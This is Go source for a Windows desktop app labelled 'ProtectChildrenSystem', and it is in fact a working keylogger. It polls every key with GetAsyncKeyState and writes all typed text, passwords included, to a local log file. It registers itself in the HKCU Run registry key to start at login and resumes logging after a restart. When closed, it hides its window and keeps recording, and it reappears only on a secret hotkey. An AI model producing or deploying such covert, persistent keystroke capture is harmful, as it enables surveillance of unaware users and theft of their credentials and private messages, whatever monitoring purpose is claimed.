package main

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"github.com/wailsapp/wails/v2/pkg/runtime"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	procGetKeyState      = user32.NewProc("GetKeyState")
)

type AppConfig struct {
	BannedWords string `json:"banned_words"`
	HotkeyCodes []int  `json:"hotkey_codes"`
	IsRunning   bool   `json:"is_running"`
	AutoStart   bool   `json:"auto_start"`
}

type App struct {
	ctx          context.Context
	isRunning    bool
	cancelFunc   context.CancelFunc
	lastKeyState [256]bool
	hotkeyCodes  []int
	bannedWords  string
	dbPath       string
	logPath      string
	isAutoStart  bool
}

func NewApp() *App {
	// Get absolute path to ensure config is found during autostart
	exePath, _ := os.Executable()
	baseDir := filepath.Dir(exePath)

	return &App{
		hotkeyCodes: []int{17, 16, 46},
		dbPath:      filepath.Join(baseDir, "db", "config.json"),
		logPath:     filepath.Join(baseDir, "db", "activity.log"),
	}
}

func (a *App) startup(ctx context.Context) {
	a.ctx = ctx
	os.MkdirAll(filepath.Dir(a.dbPath), 0755)
	a.loadFromDB()

	// Resume monitoring if it was active before restart
	if a.isRunning {
		go func() {
			time.Sleep(1 * time.Second) // Wait for system readiness
			a.ToggleProtections(true)
		}()
	}

	go a.watchGlobalHotkey()
}

func (a *App) loadFromDB() {
	file, err := os.ReadFile(a.dbPath)
	if err == nil {
		var data AppConfig
		json.Unmarshal(file, &data)
		a.bannedWords = data.BannedWords
		if len(data.HotkeyCodes) > 0 {
			a.hotkeyCodes = data.HotkeyCodes
		}
		a.isRunning = data.IsRunning
		a.isAutoStart = data.AutoStart
	}
}

func (a *App) saveToDB() {
	data := AppConfig{
		BannedWords: a.bannedWords,
		HotkeyCodes: a.hotkeyCodes,
		IsRunning:   a.isRunning,
		AutoStart:   a.isAutoStart,
	}
	file, _ := json.MarshalIndent(data, "", "  ")
	_ = os.WriteFile(a.dbPath, file, 0644)
}

func (a *App) ReadLogs() string {
	content, err := os.ReadFile(a.logPath)
	if err != nil {
		return ""
	}
	return string(content)
}

func (a *App) GetCurrentConfig() map[string]interface{} {
	return map[string]interface{}{
		"isRunning":   a.isRunning,
		"hotkeyCodes": a.hotkeyCodes,
		"bannedWords": a.bannedWords,
		"autoStart":   a.isAutoStart,
	}
}

func (a *App) UpdateBannedWords(words string) {
	a.bannedWords = words
	a.saveToDB()
}

func (a *App) UpdateHotkey(codes []int) {
	a.hotkeyCodes = codes
	a.saveToDB()
}

func (a *App) ToggleProtections(status bool) {
	if a.cancelFunc != nil {
		a.cancelFunc()
		a.cancelFunc = nil
	}

	a.isRunning = status
	a.saveToDB()

	if a.ctx != nil {
		runtime.EventsEmit(a.ctx, "status-updated", status)
	}

	if a.isRunning {
		ctx, cancel := context.WithCancel(context.Background())
		a.cancelFunc = cancel
		go a.runKeylogger(ctx)
	}
}

func (a *App) SetAutoStart(enable bool) string {
	exePath, _ := os.Executable()
	appName := "ProtectChildrenSystem"
	a.isAutoStart = enable
	a.saveToDB()

	if enable {
		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", appName, "/t", "REG_SZ", "/d", `"`+exePath+`" --autostart`, "/f").Run()
		return "Startup Enabled"
	}
	exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", appName, "/f").Run()
	return "Startup Disabled"
}

func (a *App) runKeylogger(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 1; i < 256; i++ {
				v, _, _ := procGetAsyncKeyState.Call(uintptr(i))
				if v&0x8000 != 0 && !a.lastKeyState[i] {
					char := a.mapKeys(i)
					if char != "" {
						if a.ctx != nil {
							runtime.EventsEmit(a.ctx, "new-key-event", map[string]string{"text": char})
						}
						a.writeToLog(char)
					}
				}
				a.lastKeyState[i] = v&0x8000 != 0
			}
			time.Sleep(10 * time.Millisecond)
		}
	}
}

func (a *App) mapKeys(vk int) string {
	shift, _, _ := procGetKeyState.Call(uintptr(0x10))
	isShift := (shift & 0x8000) != 0

	// Added support for CTRL, SHIFT, CAPSLOCK, TAB, and ENTER
	switch vk {
	case 0x08:
		return "[BACKSPACE]"
	case 0x0D:
		return "[ENTER]"
	case 0x09:
		return "[TAB]"
	case 0x10:
		return "[SHIFT]"
	case 0x11:
		return "[CTRL]"
	case 0x14:
		return "[CAPSLOCK]"
	case 0x20:
		return " "
	case 0xBA:
		if isShift {
			return ":"
		} else {
			return ";"
		}
	case 0xBB:
		if isShift {
			return "+"
		} else {
			return "="
		}
	case 0xBC:
		if isShift {
			return "<"
		} else {
			return ","
		}
	case 0xBD:
		if isShift {
			return "_"
		} else {
			return "-"
		}
	case 0xBE:
		if isShift {
			return ">"
		} else {
			return "."
		}
	case 0xBF:
		if isShift {
			return "?"
		} else {
			return "/"
		}
	}

	if vk >= 0x30 && vk <= 0x39 {
		sym := ")!@#$%^&*("
		if isShift {
			return string(sym[vk-0x30])
		}
		return string(rune(vk))
	}
	if vk >= 0x41 && vk <= 0x5A {
		caps, _, _ := procGetKeyState.Call(uintptr(0x14))
		char := rune(vk)
		if ((caps&0x0001 != 0) && !isShift) || ((caps&0x0001 == 0) && isShift) {
			return string(char)
		}
		return string(char + 32)
	}
	return ""
}

func (a *App) writeToLog(content string) {
	f, _ := os.OpenFile(a.logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		defer f.Close()
		f.WriteString(content)
	}
}

func (a *App) watchGlobalHotkey() {
	for {
		if len(a.hotkeyCodes) > 0 {
			allPressed := true
			for _, code := range a.hotkeyCodes {
				v, _, _ := procGetAsyncKeyState.Call(uintptr(code))
				if v&0x8000 == 0 {
					allPressed = false
					break
				}
			}
			if allPressed {
				if a.ctx != nil {
					runtime.WindowShow(a.ctx)
				}
				time.Sleep(500 * time.Millisecond)
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func (a *App) OnBeforeClose(ctx context.Context) bool {
	if a.isRunning {
		runtime.WindowHide(ctx)
		return true
	}
	return false
}
